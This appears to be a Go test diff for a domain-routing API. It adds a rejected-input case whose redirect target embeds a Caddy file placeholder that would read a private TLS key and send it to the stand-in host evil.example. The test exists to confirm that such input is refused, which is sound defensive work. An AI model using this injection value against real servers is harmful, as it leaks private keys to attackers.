@@ -152,6 +152,8 @@ func TestDomainsBecomeRoutes(t *testing.T) {
 		"a server without an edge": fmt.Sprintf(`{"hostname":"x.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, other.Id),
 		"no port":                  fmt.Sprintf(`{"hostname":"y.example.com","host":%q,"target_kind":"container","container":"web"}`, host.Id),
 		"a redirect to a path":     fmt.Sprintf(`{"hostname":"z.example.com","host":%q,"target_kind":"redirect","redirect_to":"/elsewhere"}`, host.Id),
+		// Caddy fills in placeholders: this would send the edge's key to whoever asks
+		"a redirect with a placeholder": fmt.Sprintf(`{"hostname":"w.example.com","host":%q,"target_kind":"redirect","redirect_to":"https://evil.example/{file./pocketcloud/certs/x.key}"}`, host.Id),
 	} {
 		if status, response := addDomain(t, h, operator, body); status == http.StatusOK {
 			t.Errorf("%s was accepted: %s", name, response)
